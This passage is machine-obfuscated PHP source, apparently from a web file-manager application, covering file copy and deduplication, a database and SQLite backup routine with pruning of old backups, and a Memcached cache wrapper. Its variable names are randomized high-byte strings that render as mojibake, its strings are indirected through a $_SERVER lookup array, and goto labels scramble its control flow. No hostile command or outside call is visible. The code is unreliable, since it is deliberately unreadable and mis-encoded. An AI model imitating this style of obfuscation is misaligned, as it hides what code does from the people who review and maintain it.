$eÍæßìÇ¢Í = $bÒÚ×’˜„ƒ[$aÔãÙï¡[366]]; $this->_copyApplyMeta($bÒÚ×’˜„ƒ, $D„¸Ò£”°ï); if ($B£®ÀšË¶Š[$aÔãÙï¡[29]] == $aÔãÙï¡[77]) { $B£®ÀšË¶Š[$aÔãÙï¡[76]] = $d¤Ì¤™Âä->getPathInner($B£®ÀšË¶Š[$aÔãÙï¡[76]]); $this->_copyChildTo($d¤Ì¤™Âä, $B£®ÀšË¶Š[$aÔãÙï¡[76]], $eÍæßìÇ¢Í, $B„×ì’‹¹£, $D„¸Ò£”°ï, $b‰¥Ş¯Ğ‚–); } } goto aõ¢»–›–; aâøÁÃ—ª: $Eæ¬¨±§ª¦ = array_merge($aøô¾ëœÄä[$aÔãÙï¡[74]], $aøô¾ëœÄä[$aÔãÙï¡[75]]); $bâÕŠ£Ë‡Ÿ = $this->_addFiles($d¤Ì¤™Âä, $aøô¾ëœÄä[$aÔãÙï¡[74]], $b‰¥Ş¯Ğ‚–); $b¹ˆÕÇÀÕˆ = array(); goto cø”Ù¸Å ”; cø”Ù¸Å ”: foreach ($Eæ¬¨±§ª¦ as &$B£®ÀšË¶Š) { goto Bò¿õ­”Ö; Bò¿õ­”Ö: if (isset($bâÕŠ£Ë‡Ÿ[$B£®ÀšË¶Š[$aÔãÙï¡[28]]])) { $B£®ÀšË¶Š = $bâÕŠ£Ë‡Ÿ[$B£®ÀšË¶Š[$aÔãÙï¡[28]]]; } $B£®ÀšË¶Š[$aÔãÙï¡[367]] = $B£®ÀšË¶Š[$aÔãÙï¡[29]] == $aÔãÙï¡[77]; $B£®ÀšË¶Š[$aÔãÙï¡[369]] = _get($B£®ÀšË¶Š, $aÔãÙï¡[157], $aÔãÙï¡[33]); goto CÁÚµæÃ†‡; CÁÚµæÃ†‡: $B£®ÀšË¶Š[$aÔãÙï¡[78]] = _get($B£®ÀšË¶Š, $aÔãÙï¡[78], 0); $B£®ÀšË¶Š[$aÔãÙï¡[415]] = _get($B£®ÀšË¶Š, $aÔãÙï¡[415], 0); if (!isset($B£®ÀšË¶Š[$aÔãÙï¡[533]]) && $B£®ÀšË¶Š[$aÔãÙï¡[415]]) { $D„¸Ò£”°ï[$aÔãÙï¡[530]][] = $B£®ÀšË¶Š[$aÔãÙï¡[415]]; } goto F´«½ÏÎò¶; F´«½ÏÎò¶: if ($B„×ì’‹¹£) { $e±Õ²›ˆøá = $this->fileNameExistCache($b¡Ú®—É», $B£®ÀšË¶Š[$aÔãÙï¡[28]]); if ($e±Õ²›ˆøá) { if ($B£®ÀšË¶Š[$aÔãÙï¡[367]] || $B„×ì’‹¹£ == REPEAT_SKIP) { continue; } if ($B„×ì’‹¹£ == REPEAT_REPLACE) { $bÒÚ×’˜„ƒ = $this->sourceInfoCache($e±Õ²›ˆøá); $CŠ®áÕŠ˜ = $this->fileHistory($bÒÚ×’˜„ƒ, $B£®ÀšË¶Š[$aÔãÙï¡[415]], $B£®ÀšË¶Š[$aÔãÙï¡[78]]); if ($CŠ®áÕŠ˜) { $D„¸Ò£”°ï[$aÔãÙï¡[493]][] = $B£®ÀšË¶Š[$aÔãÙï¡[415]]; } continue; } else { if ($B„×ì’‹¹£ == REPEAT_RENAME) { $B£®ÀšË¶Š[$aÔãÙï¡[28]] = $this->fileNameAutoCache($b¡Ú®—É», $B£®ÀšË¶Š[$aÔãÙï¡[28]], $B„×ì’‹¹£, !1); } } } } if (!$B£®ÀšË¶Š[$aÔãÙï¡[367]] && $B£®ÀšË¶Š[$aÔãÙï¡[415]]) { $D„¸Ò£”°ï[$aÔãÙï¡[493]][] = $B£®ÀšË¶Š[$aÔãÙï¡[415]]; } $b¹ˆÕÇÀÕˆ[] = $this->_makeItemData($B£®ÀšË¶Š, $DŒ•êô©Š, $B£®ÀšË¶Š[$aÔãÙï¡[28]]); goto BÕ¨Ö—ô¹; BÕ¨Ö—ô¹: } unset($B£®ÀšË¶Š); if (!empty($b¹ˆÕÇÀÕˆ)) { $this->addAll($b¹ˆÕÇÀÕˆ); } goto Fù×á°² ‹; aõ¢»–›–: } private function _addFiles($F¿ùâ ÛÙö, $Dò²ÈÇ×ÑÇ, $BÊ¸Ö‘»¶) { goto eã¶¥ã¯Ÿ; eã¶¥ã¯Ÿ: $dŠ²Ä–æ¡ª =& $_SERVER[ì‹É]; if (!$Dò²ÈÇ×ÑÇ || count($Dò²ÈÇ×ÑÇ) == 0) { return array(); } $aÕĞÙŠšŒâ = array(); goto DœÓ©¹¯—æ; eîÔ£ÃÊî: $cªÖ„„³¨Ú = $c‘—†øéºŞ->where($fÚŒÇµâäì)->select(); $cªÖ„„³¨Ú = $cªÖ„„³¨Ú ? $cªÖ„„³¨Ú : array(); foreach ($cªÖ„„³¨Ú as $AˆÈ×”˜Ğ·) { if (!isset($aÕĞÙŠšŒâ[$AˆÈ×”˜Ğ·[$dŠ²Ä–æ¡ª[160]]])) { continue; } $d¤‚âŠÂ° = $aÕĞÙŠšŒâ[$AˆÈ×”˜Ğ·[$dŠ²Ä–æ¡ª[160]]]; foreach ($d¤‚âŠÂ° as &$AÁ»Íõ™›²) { $AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[415]] = $AˆÈ×”˜Ğ·[$dŠ²Ä–æ¡ª[415]]; $AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[533]] = !0; } unset($AÁ»Íõ™›²); } goto E¹´©–‚ÑÆ; E¹´©–‚ÑÆ: $EÜ›œ¿½· = array(); foreach ($Dò²ÈÇ×ÑÇ as $a¼ÜÑ¡ŠµÖ) { if (isset($a¼ÜÑ¡ŠµÖ[$dŠ²Ä–æ¡ª[533]]) && $a¼ÜÑ¡ŠµÖ[$dŠ²Ä–æ¡ª[533]]) { continue; } $D¦»ÁÒ¼‹‡ = $F¿ùâ ÛÙö->getPathInner($a¼ÜÑ¡ŠµÖ[$dŠ²Ä–æ¡ª[76]]); $B‹‡Ğ‹„Ûƒ = $c‘—†øéºŞ->addFileMake($D¦»ÁÒ¼‹‡, $a¼ÜÑ¡ŠµÖ[$dŠ²Ä–æ¡ª[78]], $a¼ÜÑ¡ŠµÖ[$dŠ²Ä–æ¡ª[161]], $a¼ÜÑ¡ŠµÖ[$dŠ²Ä–æ¡ª[160]], $a¼ÜÑ¡ŠµÖ[$dŠ²Ä–æ¡ª[28]], $BÊ¸Ö‘»¶); $EÜ›œ¿½·[] = $B‹‡Ğ‹„Ûƒ; } $c‘—†øéºŞ->addAll($EÜ›œ¿½·); goto AµÃ§Œ¯´¤; AµÃ§Œ¯´¤: $fÚŒÇµâäì = array($dŠ²Ä–æ¡ª[160] => array($dŠ²Ä–æ¡ª[7], array_keys($aÕĞÙŠšŒâ))); $cªÖ„„³¨Ú = $c‘—†øéºŞ->where($fÚŒÇµâäì)->select(); $cªÖ„„³¨Ú = $cªÖ„„³¨Ú ? $cªÖ„„³¨Ú : array(); goto D¯ÎªÒìÅë; B‚©Œ¢¿¯: return $bëÊˆï¹Æ; goto Eœñíò£§¸; D¯ÎªÒìÅë: foreach ($cªÖ„„³¨Ú as $AˆÈ×”˜Ğ·) { if (!isset($aÕĞÙŠšŒâ[$AˆÈ×”˜Ğ·[$dŠ²Ä–æ¡ª[160]]])) { continue; } $B•ù°Âå¾† =& $aÕĞÙŠšŒâ[$AˆÈ×”˜Ğ·[$dŠ²Ä–æ¡ª[160]]]; foreach ($B•ù°Âå¾† as &$AÁ»Íõ™›²) { $AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[415]] = $AˆÈ×”˜Ğ·[$dŠ²Ä–æ¡ª[415]]; } unset($AÁ»Íõ™›²); } $bëÊˆï¹Æ = array(); foreach ($Dò²ÈÇ×ÑÇ as $BÒ‡›ñùÎ²) { $bëÊˆï¹Æ[$BÒ‡›ñùÎ²[$dŠ²Ä–æ¡ª[28]]] = $BÒ‡›ñùÎ²; } goto B‚©Œ¢¿¯; DœÓ©¹¯—æ: foreach ($Dò²ÈÇ×ÑÇ as &$AÁ»Íõ™›²) { goto E‰Ãò‰øšƒ; fİ‚ßÄœÏá: $Eèİîó¶¡õ = $F¿ùâ ÛÙö->hashMd5($AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[76]]); if (strlen($Eèİîó¶¡õ) > 10 && !isset($aÕĞÙŠšŒâ[$Eèİîó¶¡õ])) { $aÕĞÙŠšŒâ[$Eèİîó¶¡õ] = array(); } $AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[161]] = $eá†«±¾¢¨; goto cä†‰®êÄç; cä†‰®êÄç: $AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[160]] = $Eèİîó¶¡õ; Hook::trigger($dŠ²Ä–æ¡ª[535], $AÁ»Íõ™›²); $aÕĞÙŠšŒâ[$Eèİîó¶¡õ][] =& $AÁ»Íõ™›²; goto eŞñµº˜Üƒ; E‰Ãò‰øšƒ: Hook::trigger($dŠ²Ä–æ¡ª[534], $AÁ»Íõ™›²); $AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[76]] = $F¿ùâ ÛÙö->getPathInner($AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[76]]); $eá†«±¾¢¨ = $F¿ùâ ÛÙö->hashSimple($AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[76]]); goto fİ‚ßÄœÏá; eŞñµº˜Üƒ: if (count($aÕĞÙŠšŒâ[$Eèİîó¶¡õ]) > 1) { $AÁ»Íõ™›²[$dŠ²Ä–æ¡ª[533]] = !0; } goto b’òÃ„ù•à; b’òÃ„ù•à: } $fÚŒÇµâäì = array($dŠ²Ä–æ¡ª[160] => array($dŠ²Ä–æ¡ª[7], array_keys($aÕĞÙŠšŒâ))); $c‘—†øéºŞ = Model($dŠ²Ä–æ¡ª[536]); goto eîÔ£ÃÊî; Eœñíò£§¸: } } define($_SERVER[ì‹É][537], $_SERVER[ì‹É][538]); goto Cí™×Øë; Dî¯®šÙ¥•: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $AÊµµ³İ¥ =& $_SERVER[ì‹É]; self::$name = date($AÊµµ³İ¥[674]); if (!($b°Öù ÒÀ = Model($AÊµµ³İ¥[675])->lastItem())) { $b°Öù ÒÀ = $this->initData(); } else { self::$name = $b°Öù ÒÀ[$AÊµµ³İ¥[28]]; if ($b°Öù ÒÀ[$AÊµµ³İ¥[676]] == $AÊµµ³İ¥[84]) { self::$name = date($AÊµµ³İ¥[677]); $eÉŞÉè‰‘“ = 0; if (isset($b°Öù ÒÀ[$AÊµµ³İ¥[278]][$AÊµµ³İ¥[164]][$AÊµµ³İ¥[415]])) { $eÉŞÉè‰‘“ = (int) $b°Öù ÒÀ[$AÊµµ³İ¥[278]][$AÊµµ³İ¥[164]][$AÊµµ³İ¥[415]]; } if ($b°Öù ÒÀ[$AÊµµ³İ¥[28]] == self::$name) { Model($AÊµµ³İ¥[675])->remove($b°Öù ÒÀ[$AÊµµ³İ¥[364]]); } $b°Öù ÒÀ = $this->initData($eÉŞÉè‰‘“, $b°Öù ÒÀ[$AÊµµ³İ¥[678]]); } else { $this->checkStore($b°Öù ÒÀ[$AÊµµ³İ¥[678]]); } } self::$option = $b°Öù ÒÀ; } private function initData($d°ŸĞÎáßĞ = 0, $DÏ¼ ò©é = '') { goto A»Šˆáç“É; B¬ÎœÂÅÍ¥: $this->checkStore($Dœ¬çŸÙÀÌ[$dÚ„ŠáËàã[678]]); $E¤¥¥Œ™íù = array($dÚ„ŠáËàã[678] => $Dœ¬çŸÙÀÌ[$dÚ„ŠáËàã[678]], $dÚ„ŠáËàã[28] => self::$name, $dÚ„ŠáËàã[676] => 0, $dÚ„ŠáËàã[679] => $Dœ¬çŸÙÀÌ[$dÚ„ŠáËàã[679]], $dÚ„ŠáËàã[278] => array($dÚ„ŠáËàã[680] => array($dÚ„ŠáËàã[676] => 0), $dÚ„ŠáËàã[681] => array($dÚ„ŠáËàã[676] => 0, $dÚ„ŠáËàã[682] => 0, $dÚ„ŠáËàã[683] => 0, $dÚ„ŠáËàã[29] => $dÚ„ŠáËàã[33]), $dÚ„ŠáËàã[684] => array($dÚ„ŠáËàã[676] => 0, $dÚ„ŠáËàã[682] => 0, $dÚ„ŠáËàã[683] => 0), $dÚ„ŠáËàã[164] => array($dÚ„ŠáËàã[676] => 0, $dÚ„ŠáËàã[685] => 0, $dÚ„ŠáËàã[686] => 0, $dÚ„ŠáËàã[687] => 0, $dÚ„ŠáËàã[688] => 0, $dÚ„ŠáËàã[415] => $d°ŸĞÎáßĞ)), $dÚ„ŠáËàã[689] => time(), $dÚ„ŠáËàã[690] => 0); $D‚œ…–¶Ş = Model($dÚ„ŠáËàã[675])->insert($E¤¥¥Œ™íù); goto A–‚¤»÷ÔÉ; A»Šˆáç“É: $dÚ„ŠáËàã =& $_SERVER[ì‹É]; $Dœ¬çŸÙÀÌ = Model($dÚ„ŠáËàã[675])->config(); if ($DÏ¼ ò©é && $Dœ¬çŸÙÀÌ[$dÚ„ŠáËàã[678]] != $DÏ¼ ò©é) { $d°ŸĞÎáßĞ = 0; } goto B¬ÎœÂÅÍ¥; A–‚¤»÷ÔÉ: $E¤¥¥Œ™íù[$dÚ„ŠáËàã[364]] = $D‚œ…–¶Ş; return $E¤¥¥Œ™íù; goto ešà¶Ó…ô; ešà¶Ó…ô: } private function checkStore($AÜğñÕÕ) { $aÔÜÔœ„®° =& $_SERVER[ì‹É]; $AÒÉ¶çã° = Model($aÔÜÔœ„®°[691])->listData($AÜğñÕÕ); Model($aÔÜÔœ„®°[691])->checkConfig($AÒÉ¶çã°); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ì‹É][675])->findByName(self::$name); } return self::$option; } public static function set($e §Ó³é·°) { $BÄ³×Áç¥ =& $_SERVER[ì‹É]; $B£¹ÅµÓºß = self::get(); foreach ($e §Ó³é·° as $eÉéÛóÉÌŠ => $fÂ¦ù„Ä¬‰) { $Aµ¡åíÒéã = explode($BÄ³×Áç¥[94], $eÉéÛóÉÌŠ); $dÌ• ËçÈ = count($Aµ¡åíÒéã); switch ($dÌ• ËçÈ) { case 1: $B£¹ÅµÓºß[$Aµ¡åíÒéã[0]] = $fÂ¦ù„Ä¬‰; break; case 2: $B£¹ÅµÓºß[$Aµ¡åíÒéã[0]][$Aµ¡åíÒéã[1]] = $fÂ¦ù„Ä¬‰; break; case 3: $B£¹ÅµÓºß[$Aµ¡åíÒéã[0]][$Aµ¡åíÒéã[1]][$Aµ¡åíÒéã[2]] = $fÂ¦ù„Ä¬‰; break; } } Model($BÄ³×Áç¥[675])->update($B£¹ÅµÓºß[$BÄ³×Áç¥[364]], $B£¹ÅµÓºß); self::$option = $B£¹ÅµÓºß; return self::$option; } public function keep() { $fÉÖÉ˜í“í =& $_SERVER[ì‹É]; $A–ÒÚÅ¼¢Ô = self::get(); if ($A–ÒÚÅ¼¢Ô[$fÉÖÉ˜í“í[278]][$fÉÖÉ˜í“í[680]][$fÉÖÉ˜í“í[676]] == $fÉÖÉ˜í“í[84]) { return; } $this->backupKeep($A–ÒÚÅ¼¢Ô); self::set(array($fÉÖÉ˜í“í[692] => 1)); } private function backupKeep($DÁõŒ‡†ƒ) { goto AµÇ¦õÉ’; AµÇ¦õÉ’: $b ¯‚¥¼éÄ =& $_SERVER[ì‹É]; $fÆªâµ¨á = Model($b ¯‚¥¼éÄ[675])->listData(); if (empty($fÆªâµ¨á)) { return; } goto dÅÔØ÷ÄØá; fºŒĞ¡’÷: $CÔ’ãİ£ÆÑ = array_unique($CÔ’ãİ£ÆÑ); foreach ($fÆªâµ¨á as $eÙ—ŸÂ†×ö) { if (!empty($eÙ—ŸÂ†×ö[$b ¯‚¥¼éÄ[28]]) && in_array($eÙ—ŸÂ†×ö[$b ¯‚¥¼éÄ[28]], $CÔ’ãİ£ÆÑ)) { continue; } Model($b ¯‚¥¼éÄ[675])->remove($eÙ—ŸÂ†×ö[$b ¯‚¥¼éÄ[364]]); $D •óï® = "\x7b\x69\157\72{$DÁõŒ‡†ƒ[$b ¯‚¥¼éÄ[678]]}\175\57\x64\141\164\141\x62\x61\x73\145\x2f\x62\141\143\153\165\160\137{$eÙ—ŸÂ†×ö[$b ¯‚¥¼éÄ[28]]}"; IO::remove($D •óï®, !1); } goto AÚ¿î·Í÷–; dÅÔØ÷ÄØá: $CÔ’ãİ£ÆÑ = array(); for ($c¼§°º…ç = 0; $c¼§°º…ç <= 7; $c¼§°º…ç++) { $CÔ’ãİ£ÆÑ[] = date($b ¯‚¥¼éÄ[677], strtotime("\x2d{$c¼§°º…ç}\x20\x64\x61\x79\163")); } for ($c¼§°º…ç = 0; $c¼§°º…ç < 12; $c¼§°º…ç++) { $CÔ’ãİ£ÆÑ[] = date($b ¯‚¥¼éÄ[693], strtotime("\55{$c¼§°º…ç}\40\x6d\157\x6e\x74\x68\163")); } goto fºŒĞ¡’÷; AÚ¿î·Í÷–: } public function db() { goto aë‘ôâ£‡; aë‘ôâ£‡: $D”¼˜Ó£·’ =& $_SERVER[ì‹É]; $e£œœ¸ø¬ = self::get(); if ($e£œœ¸ø¬[$D”¼˜Ó£·’[278]][$D”¼˜Ó£·’[681]][$D”¼˜Ó£·’[676]] == $D”¼˜Ó£·’[84]) { return !0; } goto F¢Œ½¯´Üª; c÷ÇàÚëÁ¡: return !0; goto EÄ¼¯×¯ß ; F¢Œ½¯´Üª: $a™ÔÖï™‡… = new BackupDb(); if (!$a™ÔÖï™‡…->index()) { return !1; } self::set(array($D”¼˜Ó£·’[694] => 1)); goto c÷ÇàÚëÁ¡; EÄ¼¯×¯ß : } public function dbFile() { goto cÏîÇÛ·«; B •‡çĞøõ: $fÓéÅ˜‡‰  = new BackupDbFile(); if (!$fÓéÅ˜‡‰ ->index()) { return !1; } self::set(array($bï÷Í[695] => 1)); goto A¦èÔ‘†ŒÃ; cÏîÇÛ·«: $bï÷Í =& $_SERVER[ì‹É]; $eÙòŠ—ù·¤ = self::get(); if ($eÙòŠ—ù·¤[$bï÷Í[278]][$bï÷Í[684]][$bï÷Í[676]] == $bï÷Í[84]) { return !0; } goto B •‡çĞøõ; A¦èÔ‘†ŒÃ: return !0; goto bíŒŠÕÏ”å; bíŒŠÕÏ”å: } public function file() { $f˜ˆğó¶¼ =& $_SERVER[ì‹É]; $Cá‹à•Ä‘Ÿ = self::get(); if ($Cá‹à•Ä‘Ÿ[$f˜ˆğó¶¼[278]][$f˜ˆğó¶¼[164]][$f˜ˆğó¶¼[676]] == $f˜ˆğó¶¼[84]) { return !0; } if (!isset($Cá‹à•Ä‘Ÿ[$f˜ˆğó¶¼[679]]) || $Cá‹à•Ä‘Ÿ[$f˜ˆğó¶¼[679]] == $f˜ˆğó¶¼[464]) { $eóÅƒÊ‰¸Ñ = new BackupFile(); if (!$eóÅƒÊ‰¸Ñ->index()) { return !1; } } self::set(array($f˜ˆğó¶¼[696] => 1, $f˜ˆğó¶¼[676] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto B«²á¯™‚; f³ŠÎ…‹Ÿ: Backup::set($AÃˆ×ù«Í§); return !0; goto f’ŒâŞ¢××; Fã…—…œ¥: self::$name = $AĞÇáˆ‘‡ˆ[$eŠäÓ‹Ë¼ƒ[28]]; if ($AÂ†ì—Ğè = $this->sqliteFile()) { return $this->sqliteBackup($AÂ†ì—Ğè); } $b¹Ç“à¾ĞÚ = 0; goto BŒÚêç¬š; BŒÚêç¬š: $AŠÛÀ¨ÍÃ¨ = Model()->db()->getTables(); foreach ($AŠÛÀ¨ÍÃ¨ as $FïÄÌ³—Æ™) { $b¹Ç“à¾ĞÚ += Model($FïÄÌ³—Æ™)->count(); } $d“ïÃÌåİæ = new Task($eŠäÓ‹Ë¼ƒ[697], $eŠäÓ‹Ë¼ƒ[698], $b¹Ç“à¾ĞÚ, LNG($eŠäÓ‹Ë¼ƒ[699]) . $eŠäÓ‹Ë¼ƒ[700] . LNG($eŠäÓ‹Ë¼ƒ[701])); goto FÁÈ³Åà³È; FÁÈ³Åà³È: $AÃˆ×ù«Í§ = array($eŠäÓ‹Ë¼ƒ[702] => $eŠäÓ‹Ë¼ƒ[703], $eŠäÓ‹Ë¼ƒ[704] => $b¹Ç“à¾ĞÚ + 1); Backup::set($AÃˆ×ù«Í§); $C¬ÂÕ˜ ¹‡ = 0; goto A“ãÌ¾²ªÂ; A“ãÌ¾²ªÂ: $díŞ‡ôšâ = TEMP_FILES . $eŠäÓ‹Ë¼ƒ[705] . self::$name . $eŠäÓ‹Ë¼ƒ[8]; del_dir($díŞ‡ôšâ); mk_dir($díŞ‡ôšâ); goto eä„‘©×³; B«²á¯™‚: $eŠäÓ‹Ë¼ƒ =& $_SERVER[ì‹É]; $AĞÇáˆ‘‡ˆ = Backup::get(); self::$io = $AĞÇáˆ‘‡ˆ[$eŠäÓ‹Ë¼ƒ[678]]; goto Fã…—…œ¥; eä„‘©×³: foreach ($AŠÛÀ¨ÍÃ¨ as $FïÄÌ³—Æ™) { $AïİØ°¦… = "{$díŞ‡ôšâ}{$FïÄÌ³—Æ™}\56\163\x71\154"; $C¬ÂÕ˜ ¹‡ += $this->makeSqlFile($FïÄÌ³—Æ™, $AïİØ°¦…, $d“ïÃÌåİæ, $AĞÇáˆ‘‡ˆ); } $d“ïÃÌåİæ->end(); $AÃˆ×ù«Í§ = array($eŠäÓ‹Ë¼ƒ[694] => 1, $eŠäÓ‹Ë¼ƒ[706] => $C¬ÂÕ˜ ¹‡); goto f³ŠÎ…‹Ÿ; f’ŒâŞ¢××: } public function makeSqlFile($b¶ôÚÌ±ğ”, $FÖØŠ•ÂÏÚ, $f æÚ”’–, $a‘áØí±£) { goto dö¨®Ã‰…·; AšêÑÉÅÊˆ: $aŠ·Òñ‰º = Model($b¶ôÚÌ±ğ”)->getDbFields(); do { $A§äÇö†©¢ = Model($b¶ôÚÌ±ğ”)->field($aŠ·Òñ‰º)->order($Aë›ØÒ“ˆù . $_SERVER[ì‹É][708])->selectPage($dã¸ƒ™¶Å, $aÖÁ‚§¸”); $F²×Ú¿ËåÀ = !empty($A§äÇö†©¢[$_SERVER[ì‹É][350]]) ? $A§äÇö†©¢[$_SERVER[ì‹É][350]] : array(); $AÊÁ¢Äá… = array(); foreach ($F²×Ú¿ËåÀ as $F¥ìÛ¸”¯é) { if ($b¶ôÚÌ±ğ” == $_SERVER[ì‹É][709] && (!isset($a‘áØí±£[$_SERVER[ì‹É][679]]) || $a‘áØí±£[$_SERVER[ì‹É][679]] == $_SERVER[ì‹É][464])) { $F¥ìÛ¸”¯é[$_SERVER[ì‹É][76]] = "\x7b\x69\157\72{$CÃ×²…Å‰„}\x7d" . substr($F¥ìÛ¸”¯é[$_SERVER[ì‹É][76]], strlen("\x7b\151\x6f\72{$F¥ìÛ¸”¯é[$_SERVER[ì‹É][710]]}\x7d")); $F¥ìÛ¸”¯é[$_SERVER[ì‹É][710]] = $CÃ×²…Å‰„; } $AÊÁ¢Äá…[] = $_SERVER[ì‹É][711] . $this->addSqlSlashes($F¥ìÛ¸”¯é) . $_SERVER[ì‹É][712]; } if ($f—ò”•åæ = count($F²×Ú¿ËåÀ)) { $aÛ†¼í¸”Ğ = "\x49\116\x53\x45\122\124\40\x49\x4e\x54\117\40\x60{$b¶ôÚÌ±ğ”}\x60\40\x28\140" . implode($_SERVER[ì‹É][713], $aŠ·Òñ‰º) . $_SERVER[ì‹É][714]; fwrite($b››Ïš¿ãÙ, $aÛ†¼í¸”Ğ . implode($_SERVER[ì‹É][715], $AÊÁ¢Äá…) . $_SERVER[ì‹É][68] . PHP_EOL); $f æÚ”’–->update($f—ò”•åæ); } $aÖÁ‚§¸”++; $f…ãæñ»ğ± += $f—ò”•åæ; } while ($f—ò”•åæ == $dã¸ƒ™¶Å); fclose($b››Ïš¿ãÙ); goto A›¡Ì”šË; B«İÍ»”Ëê: $dã¸ƒ™¶Å = 2000; $b››Ïš¿ãÙ = fopen($FÖØŠ•ÂÏÚ, $_SERVER[ì‹É][707]); $Aë›ØÒ“ˆù = Model($b¶ôÚÌ±ğ”)->getPk(); goto AšêÑÉÅÊˆ; A›¡Ì”šË: return $f…ãæñ»ğ±; goto E´†§ìŞôÏ; dö¨®Ã‰…·: $CÃ×²…Å‰„ = self::$io; $f…ãæñ»ğ± = 0; $aÖÁ‚§¸” = 1; goto B«İÍ»”Ëê; E´†§ìŞôÏ: } private function addSqlSlashes($EËù§ÎÍÓå) { $fîë¢Òª¡Æ =& $_SERVER[ì‹É]; $a‰ÒØ–ˆ• = array(); foreach ($EËù§ÎÍÓå as $F˜Í–ƒëºå) { if (is_array($F˜Í–ƒëºå)) { $F˜Í–ƒëºå = json_encode_force($F˜Í–ƒëºå); } $F˜Í–ƒëºå = addslashes($F˜Í–ƒëºå); $F˜Í–ƒëºå = str_replace(array($fîë¢Òª¡Æ[716], $fîë¢Òª¡Æ[214]), array($fîë¢Òª¡Æ[717], $fîë¢Òª¡Æ[718]), $F˜Í–ƒëºå); $a‰ÒØ–ˆ•[] = $F˜Í–ƒëºå; } return $fîë¢Òª¡Æ[55] . implode($fîë¢Òª¡Æ[719], $a‰ÒØ–ˆ•) . $fîë¢Òª¡Æ[55]; } private function sqliteFile() { $Dµî¢ùĞ¡ =& $_SERVER[ì‹É]; $c„«‰¼˜¡Ş = null; $b‡Æ£•Ï÷ = $GLOBALS[$Dµî¢ùĞ¡[6]][$Dµî¢ùĞ¡[17]]; if ($b‡Æ£•Ï÷[$Dµî¢ùĞ¡[720]] == $Dµî¢ùĞ¡[721]) { $Cã¿ÓÍÂ‚£ = explode($Dµî¢ùĞ¡[722], $b‡Æ£•Ï÷[$Dµî¢ùĞ¡[723]]); if (substr($Cã¿ÓÍÂ‚£[0], 0, 6) == $Dµî¢ùĞ¡[9]) { $c„«‰¼˜¡Ş = $Cã¿ÓÍÂ‚£[1]; } } else { if (substr($b‡Æ£•Ï÷[$Dµî¢ùĞ¡[720]], 0, 6) == $Dµî¢ùĞ¡[9]) { $c„«‰¼˜¡Ş = $b‡Æ£•Ï÷[$Dµî¢ùĞ¡[231]]; } } return $c„«‰¼˜¡Ş; } public function sqliteBackup($Aš‹ğòòƒæ) { goto EÆ‰‹“½ä‚; EÆ‰‹“½ä‚: $B¦Œ“†×ìí =& $_SERVER[ì‹É]; $C“ÕğÑë¾ = self::$io; $a¹ß•Œ£ÙŒ = CONTROLLER_DIR . $B¦Œ“†×ìí[724]; goto f¬Ìµ‘¢Ÿå; f¬Ìµ‘¢Ÿå: $DñÒ¡™í› = "\x7b\151\157\x3a{$C“ÕğÑë¾}\x7d\57\144\141\x74\141\x62\141\163\145\57\x62\x61\143\153\x75\160\x5f" . self::$name . $B¦Œ“†×ìí[725]; if (!IO::exist($DñÒ¡™í›)) { IO::mkdir($DñÒ¡™í›); } $b†£·‚Ûäƒ = IO::size($Aš‹ğòòƒæ); goto Cùˆ»¶Ş”†; DÒ“‰Ğ´ê¡: $F·Š‚‹”µ->end(); $bß¡­ëŒ°¤ = array($B¦Œ“†×ìí[694] => 1, $B¦Œ“†×ìí[706] => 1, $B¦Œ“†×ìí[695] => 1, $B¦Œ“†×ìí[730] => $b†£·‚Ûäƒ); Backup::set($bß¡­ëŒ°¤); goto a…›êÓ‡°; Côî—¡™: $F·Š‚‹”µ->task[$B¦Œ“†×ìí[685]] = $b†£·‚Ûäƒ; IO::copy($a¹ß•Œ£ÙŒ . $B¦Œ“†×ìí[729], $DñÒ¡™í›); IO::copy($Aš‹ğòòƒæ, $DñÒ¡™í›); goto DÒ“‰Ğ´ê¡; Cùˆ»¶Ş”†: $bß¡­ëŒ°¤ = array($B¦Œ“†×ìí[702] => $B¦Œ“†×ìí[9], $B¦Œ“†×ìí[704] => 1, $B¦Œ“†×ìí[726] => $b†£·‚Ûäƒ); Backup::set($bß¡­ëŒ°¤); $F·Š‚‹”µ = new TaskFileTransfer($B¦Œ“†×ìí[727], $B¦Œ“†×ìí[698], 1, LNG($B¦Œ“†×ìí[699]) . $B¦Œ“†×ìí[408] . LNG($B¦Œ“†×ìí[701]) . $B¦Œ“†×ìí[728]); goto Côî—¡™; a…›êÓ‡°: return !1; goto dµŒóš¶ŒË; dµŒóš¶ŒË: } } $eºÊ‚ˆ‡îù = LIB_DIR . $_SERVER[ì‹É][731]; goto fÑÔß¥±ƒù; B†£°áÂÚ‹: class CacheMemcached { public $handle; public $cacheTime; public function __construct($AÎó¯èÔ’¹, $f¨Õ»á™Ê) { $cò…©ÇÚ÷ =& $_SERVER[ì‹É]; if (!class_exists($cò…©ÇÚ÷[780])) { show_json($cò…©ÇÚ÷[781], !1); } $this->cacheTime = $f¨Õ»á™Ê; $this->handle = new Memcached(); if (is_array($AÎó¯èÔ’¹[$cò…©ÇÚ÷[782]]) && count($AÎó¯èÔ’¹[$cò…©ÇÚ÷[782]]) >= 1) { foreach ($AÎó¯èÔ’¹[$cò…©ÇÚ÷[782]] as $d¦ÕäÏ‚’) { $eº¼í‡óß˜ = explode($cò…©ÇÚ÷[4], $d¦ÕäÏ‚’); $this->handle->addServer($eº¼í‡óß˜[0], $eº¼í‡óß˜[1]); } } else { $this->handle->addServer($AÎó¯èÔ’¹[$cò…©ÇÚ÷[166]], $AÎó¯èÔ’¹[$cò…©ÇÚ÷[167]]); } } public function set($aŸÈŠŠ ¸™, $a÷ãŞ¿äÒ¿, $a™‘ ƒÙÓÜ = false) { $a™‘ ƒÙÓÜ = $a™‘ ƒÙÓÜ ? $a™‘ ƒÙÓÜ : $this->cacheTime; return $this->handle->set($aŸÈŠŠ ¸™, $a÷ãŞ¿äÒ¿, $a™‘ ƒÙÓÜ); } public function get($fö‰ÏîØØò) { return $this->handle->get($fö‰ÏîØØò); } public function 